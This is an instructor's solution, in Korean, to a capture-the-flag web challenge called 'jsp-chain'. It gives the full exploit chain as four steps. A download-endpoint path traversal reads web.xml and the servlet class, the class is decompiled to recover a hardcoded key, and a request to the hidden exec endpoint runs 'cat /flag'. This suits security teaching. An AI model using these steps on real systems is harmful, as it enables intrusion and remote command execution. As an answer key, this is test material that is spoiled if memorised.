# [강사용] jsp-chain 풀이

1. 매핑 확인:
```
GET /download?file=WEB-INF/web.xml
```
→ `<url-pattern>/sys/exec-9f3a</url-pattern>` (com.corp.AdminServlet) 발견.

2. 클래스 확보:
```
GET /download?file=WEB-INF/classes/com/corp/AdminServlet.class  -o AdminServlet.class
```

3. 디컴파일 (예: CFR):
```
java -jar cfr.jar AdminServlet.class
```
→ `OPS_KEY = "Zx9_d3c0mp1l3_th1s_k3y_2026"`, `Runtime.getRuntime().exec(cmd)` 확인.

4. RCE:
```
GET /sys/exec-9f3a?key=Zx9_d3c0mp1l3_th1s_k3y_2026&cmd=cat%20/flag
```
→ flag.
